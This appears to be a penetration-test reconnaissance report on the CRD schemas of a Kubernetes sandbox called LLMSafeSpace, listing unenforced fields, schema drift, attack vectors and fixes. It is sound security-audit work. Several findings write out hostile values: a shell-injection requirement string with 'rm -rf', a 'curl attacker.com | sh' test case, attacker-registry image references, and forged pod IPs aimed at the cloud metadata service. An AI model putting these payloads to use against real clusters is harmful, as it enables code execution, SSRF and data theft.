# RT-1.2 — CRD Schema Analysis

**Phase:** 1 (Reconnaissance)
**Sources:** `pkg/apis/llmsafespace/v1/{workspace,runtimeenvironment}_types.go`, `pkg/crds/*.yaml`, `charts/llmsafespace/crds/*.yaml`, `controller/internal/webhooks/*.go`, `controller/internal/workspace/controller.go`, `controller/internal/workspace/runtime_resolver.go`.
**Method:** static analysis with cross-reference between Go kubebuilder markers, served CRD schema, and controller code that consumes each field.

---

## Executive summary

LLMSafeSpace defines two CRDs: `Workspace` (namespaced) and `RuntimeEnvironment` (cluster-scoped). Only **one** validating webhook is registered, and it only protects `RuntimeEnvironment` with the weakest possible checks (non-empty `image` and `language`). **No `Workspace` webhook exists.** Workspace validation rests entirely on the OpenAPI v3 schema embedded in the served CRD, which has loose-to-absent constraints on the highest-impact fields.

Three classes of finding:

1. **Security theater** — fields exist in spec but no controller code reads them: `Spec.SecurityLevel`, `Spec.NetworkAccess`, `Spec.Credentials`, `Spec.PodSecurityContext.SeccompProfile`, `Spec.Resources.*`. Either dead code or unimplemented features that mislead operators.
2. **Schema drift** — multiple fields differ between the Go kubebuilder markers and the served CRD YAML: `autoSuspend.enabled` defaults differ, `resources.cpu/memory` patterns missing from YAML, `autoApprovePermissions` and `imageTag` declared in Go but pruned by apiserver because absent from served CRD. Helm chart CRDs further drift from canonical CRDs.
3. **Direct attack vectors** — `Spec.Runtime` containing `/` becomes the container image reference verbatim; `Spec.Status.PodIP`/`PodName`/`PodNamespace` are trusted by API handlers for SSRF-sensitive operations; `Spec.Packages[].Requirements[]` are concatenated into a shell script.

---

## 1. Webhooks registered

| Webhook | Path | Resource | Verbs | Enforced rules | Source |
|---|---|---|---|---|---|
| `vruntimeenvironment.llmsafespace.dev` | `/validate-llmsafespace-dev-v1-runtimeenvironment` | `runtimeenvironments` (Cluster) | CREATE, UPDATE | non-empty `spec.image`; non-empty `spec.language` | `controller/internal/webhooks/runtimeenvironment_webhook.go:30-36` |

**No mutating webhook exists. No webhook for `Workspace` exists.** TLS cert and CA-bundle injection rely on cert-manager (`charts/llmsafespace/templates/validating-webhook.yaml:11`); webhook is gated on `webhooks.enabled` Helm value.

---

## 2. WorkspaceSpec — field analysis

| Field | Type | Validation | Pentest concern |
|---|---|---|---|
| `owner.userID` | string | required, no length/charset check (`workspace_crd.yaml:31-35`) | Trust boundary: API uses `crd.Spec.Owner.UserID` for ownership checks. With `patch workspaces` + no webhook, mutation of owner.userID is not blocked. |
| `runtime` | string | required, **no pattern, no enum, no length cap** | **CRITICAL — image-pull from attacker registry.** If `runtime` contains `/`, controller passes it verbatim into `mainContainer.Image` (`runtime_resolver.go:32-34` → `controller.go:591`) without RuntimeEnvironment lookup. `runtime: "evil.example.com/malicious:latest"` ⇒ kubelet pulls attacker image. Allowlist must come from API service; CRD enforces nothing. |
| `securityLevel` | enum `["standard","high"]` | enum-validated | **Security theater** — controller never reads this field. Documenting "high" as a security mode that does nothing is misleading. |
| `storage.size` | string | pattern `^[0-9]+(Gi\|Mi)$` | **No upper bound.** `999999999999Gi` is syntactically valid; PVC creation hits storage quotas. |
| `storage.storageClassName` | string | none | User picks any StorageClass on cluster. No allowlist. |
| `storage.accessMode` | enum | enum-validated | Bound to RWO/RWM. |
| `networkAccess.egress[].domain` | string | required, no pattern | **NOT ENFORCED ANYWHERE.** Zero consumers in controller. NetworkPolicy comes from static Helm chart, not derived from Spec. Field is security theater. |
| `autoSuspend.enabled` | bool | YAML default `false` (`workspace_crd.yaml:75-76`); Go default `true` (`workspace_types.go:42-43`) | **Schema drift** — served CRD wins, so workspaces silently never auto-suspend unless user opts in. |
| `autoSuspend.idleTimeoutSeconds` | int64 | min 1, no max | Same drift; user can set max-int64. |
| `packages[].runtime` | string | required, no pattern | Determines which package manager runs in init container. |
| `packages[].requirements[]` | []string | required, no per-item pattern, no count cap | **Command injection.** `controller.go:786-798`: `args += " " + req` then concatenated into `pip install`/`npm install` shell command. `requirements: ["; rm -rf /workspace; #"]` injects shell. Init container has ROFS + drops caps + runs non-root, but has PVC R/W. |
| `initScript` | string | none | **Designed-in arbitrary code execution.** Inlined into init container shell (`controller.go:801-806`). Trust model: workspace owner already controls workspace; concern is anyone with `patch workspaces` (compromised lower-priv account) gains code-exec via this field. |
| `maxActiveSessions` | int32 | min 1, max 20, default 5 | Bounded. |
| `credentials.secretName` | string | none | **Dead field** — no consumer in API or controller. Should be removed or wired up. |
| `timeout` | int | min 0, max 86400, default 0 | Bounded. |
| `resources.cpu` | string | **no pattern in YAML**; pattern in Go but does NOT apply at runtime | **NOT ENFORCED, NOT APPLIED.** (1) Go regex missing from served CRD → no apiserver pattern check. (2) Controller **never sets `mainContainer.Resources` at all** (search returns only PVC volume requests). Workspace pods have **no CPU/memory limits** beyond cluster LimitRange. DoS: any workspace can saturate a node. |
| `resources.memory` | string | same drift | Same — not enforced, not applied. |
| `resources.ephemeralStorage` | string | same | Same — ephemeral storage exhaustion can fill node disks. |
| `resources.cpuPinning` | bool | none | Dead field. |
| `restartGeneration` | int64 | default 0 | Increment forces pod restart; thrash-DoS, no upper bound. |
| `maxRetries` | int32 | min 0, max 10, default 3 | Bounded. |
| `podSecurityContext.runAsUser` | int64 | none | **Partial enforcement.** Controller treats `0` as "use default 1000" but accepts `1`, `2`, `99` (system UIDs). Container-level hard-coded `RunAsNonRoot=true` (`controller.go:621`) is the actual root blocker. |
| `podSecurityContext.runAsGroup` | int64 | none | Flows into `RunAsGroup` and `FSGroup`. `FSGroup` controls volume ownership; volumes are EmptyDir + PVC, no hostPath, so impact is bounded. |
| `podSecurityContext.seccompProfile` | string | none | **NOT CONSUMED.** Field declared but `buildPodSecurityContext` never reads it. Pod gets cluster default seccomp regardless of spec. |
| `autoApprovePermissions` | bool | declared in Go, **NOT in served CRD** | **Schema-drift footgun.** Pruned by apiserver from incoming objects. API reads field at `proxy.go:973-977` for an authorization decision. Net: feature is permanently disabled. **Future schema-fix without auth review = silent privilege escalation.** |

---

## 3. WorkspaceStatus — field analysis

Status fields are normally controller-set, but anyone with `patch workspaces/status` permission can write them. **No admission webhook on Workspace** means forged status passes through.

| Field | Pentest concern |
|---|---|
| `phase` (enum) | Enum-validated. Forging `phase=Active` could trick API handlers gating on `Phase == Active` (`proxy.go:301`, `terminal.go:226`). |
| `pvcName` (string) | No validation. Used at `controller.go:635` as `ClaimName` in pod spec. **Forged `pvcName` could mount any PVC in the namespace** into the next pod the controller builds — cross-workspace data theft. |
| `podName`, `podNamespace` (string) | **CRITICAL — `kubectl exec` target hijack.** `terminal.go:249` passes `Status.PodName` and `Status.PodNamespace` directly into `bridgeExec`. Forged `Status.PodName=kube-apiserver-xyz`, `PodNamespace=kube-system` ⇒ WebSocket terminal opens against any pod the controller SA can exec into. **Privilege escalation by data injection.** |
| `podIP` (string) | **CRITICAL — SSRF.** `proxy.go:361, 373, 809, 1000, 1051` and `proxy_input.go:98` use `Status.PodIP` to build HTTP target URLs. Forged `Status.PodIP=169.254.169.254` (cloud metadata) or `10.0.0.1` (internal) routes the user's authenticated proxy traffic to the attacker-chosen IP. |
| `endpoint` | Computed but not consumed by API. |
| `imageTag` (string) | **MISSING from served CRD schema.** Pruned by apiserver. Latent bug. |

---

## 4. RuntimeEnvironmentSpec — field analysis

| Field | Validation | Pentest concern |
|---|---|---|
| `image` | webhook: non-empty only | **CRITICAL — image-pull from attacker registry.** No registry allowlist, no format validation, no signature requirement. Anyone with `create runtimeenvironments` cluster-wide who creates `python-3.11` mapping to `image: evil.example.com/x:y` causes every Workspace using `runtime: python:3.11` to pull and execute attacker code. |
| `language` | webhook: non-empty | Used in language:version match. Naming collision = registry-poisoning attack. Webhook only rejects empty string. |
| `version` | none | No constraints. |
| `tags`, `preInstalledPackages`, `packageManager`, `securityFeatures` | none | Informational. `securityFeatures` is misleading — claims security properties but no enforcement; pure documentation field. |
| `resourceRequirements.*` | none | No pattern, no consumer. Dead fields. |
| `requiresCredentials` | declared in `pkg/crds/runtimeenvironment_crd.yaml:68-71`, **MISSING from `charts/llmsafespace/crds/runtimeenvironment.yaml`** | Pruned by apiserver in Helm-deployed clusters. Behavioural divergence between deployment paths. |

---

## 5. Spec field → pod spec materialization map

| Spec field | Materializes into | Source | Further validated? |
|---|---|---|---|
| `runtime` | `mainContainer.Image` (verbatim if `/`) | `controller.go:591` via `runtime_resolver.go:32-34` | **No** |
| `runtime` (no `/`) | RuntimeEnvironment lookup → `env.Spec.Image` | `runtime_resolver.go:36-79` → `controller.go:591` | **No** — only "non-empty" |
| `storage.size` | PVC `Resources.Requests[storage]` | `controller.go:533, 550-553` | Pattern at apiserver only |
| `storage.accessMode` | PVC `AccessModes` | `controller.go:534-537, 549` | Enum at apiserver |
| `storage.storageClassName` | PVC `Spec.StorageClassName` | `controller.go:555-556` | **No** — any class accepted |
| `packages[]` | Init-container shell script | `controller.go:781-799` | **No — direct shell injection** |
| `initScript` | Init-container shell script | `controller.go:801-806` | **No** — by design |
| `podSecurityContext.runAsUser` | Pod `SecurityContext.RunAsUser` (0→1000) | `controller.go:687-700` | Container-level hard-coded `RunAsNonRoot=true` |
| `podSecurityContext.seccompProfile` | **NOWHERE** | n/a | n/a |
| `resources.*` | **NOWHERE** | n/a | n/a (no CPU/mem limits on workspace pods) |
| `networkAccess.*` | **NOWHERE** | n/a | n/a |
| `securityLevel` | **NOWHERE** | n/a | n/a |
| `credentials.secretName` | **NOWHERE** | n/a | n/a |
| `autoApprovePermissions` | API authorization decision | `proxy.go:973-977` | Always pruned to `false` by apiserver (CRD drift) |

---

## 6. Phase-1 derived findings (promote to Phase 2+ test plan)

Ranked by exploitability × impact:

### F1.2.1 (Critical) — `Spec.Runtime` arbitrary image pull
`runtime_resolver.go:32-34` → `controller.go:591`. Any user with `create workspaces.llmsafespace.dev` can specify `runtime: attacker.com/img:latest`; kubelet pulls and runs. **No allowlist anywhere.** Promote to **RT-2.18**: confirm whether the API service applies a runtime allowlist and bypass it.

### F1.2.2 (Critical) — `Status.PodIP/PodName/PodNamespace` forge → SSRF + pod-exec hijack
`proxy.go:361, 1000`; `terminal.go:249`. With `patch workspaces/status` on a single workspace, proxy traffic and terminal sessions redirect to attacker-chosen pods. Promote to **RT-3.18**: forge status subresource with kubectl, confirm proxy and terminal hijack.

### F1.2.3 (High) — `Spec.Resources.*` not applied to pod
`controller.go:589-631`. Workspace pods have no CPU/memory limits regardless of spec. **Cluster DoS by single workspace.** Promote to **RT-3.19** under resource-exhaustion testing.

### F1.2.4 (High) — `Spec.NetworkAccess` not enforced
No consumer in controller package. Per-workspace egress allowlists silently ignored. Promote to **RT-5.15**: configure `egress: [domain: api.openai.com]` and confirm pod can still reach arbitrary domains.

### F1.2.5 (High) — `Spec.Packages[].Requirements[]` shell injection in init container
`controller.go:786-798`. User-controlled strings concatenated into shell script with no escaping. Promote to **RT-3.20**: confirm `requirements: ["evil; curl attacker.com | sh"]` executes.

### F1.2.6 (Medium) — `autoApprovePermissions` schema drift
`workspace_types.go:120-124` vs both CRD YAMLs. Currently safe but the API code reads it as if it could be true. Future schema-fix without auth review = silent privilege escalation. Promote to **F1.2.6 (documentation)**: add to threat model as A11.

### F1.2.7 (Medium) — Helm CRD drift
Missing `requiresCredentials`, missing status fields. Helm-deployed clusters have a different runtime CRD than canonical. Cross-reference to RT-6.13 (chart upgrade test).

### F1.2.8 (Medium) — `Spec.PodSecurityContext.SeccompProfile` ignored
Field declared but never applied. Any "I asked for runtime/default profile" promise is unmet. Promote to **RT-3.7** (already covers seccomp testing); cross-reference.

### F1.2.9 (Medium) — `Spec.Storage.StorageClassName` no allowlist
User can pick any StorageClass on cluster. Promote to **RT-3.21**: confirm pod can mount via attacker-controlled CSI driver if such a class exists.

### F1.2.10 (Low/Medium) — `RuntimeEnvironment.Spec.Image` validated only for non-empty
Cluster admin (or anyone with `runtimeenvironments` create) can publish a malicious "python:3.11" mapping that all workspaces inherit. Promote to **RT-6.10** (already covers image pull from untrusted registry); cross-reference.

---

## 7. Recommendations (out of scope for the pentest, but immediate fixes)

- **Add a Workspace validating webhook** that enforces a runtime allowlist, denies `Spec.Runtime` containing `/` unless from an allowlist, and validates `storage.storageClassName` against a configured set.
- **Wire `Spec.Resources` into `mainContainer.Resources`** at `controller.go:589-631`, OR remove the field entirely.
- **Either remove or implement** `Spec.NetworkAccess`, `Spec.SecurityLevel`, `Spec.Credentials`, `Spec.PodSecurityContext.SeccompProfile`. Current state is misleading.
- **Reconcile schema drift.** Generate YAML from Go via `controller-gen`; pick one source of truth.
- **RBAC enforcement on `status` subresource.** The Workspace API should not let non-controller principals patch `status.podIP`, `status.podName`, `status.podNamespace`, `status.pvcName`. K8s status subresource is admin-only by default but `*` verbs in RBAC bindings expose it.
- **Validate `Spec.Packages[].Requirements[]` items** against a safe regex (valid pip/npm package names) before building init script, OR use `argv[]` form instead of string-concatenated shell.
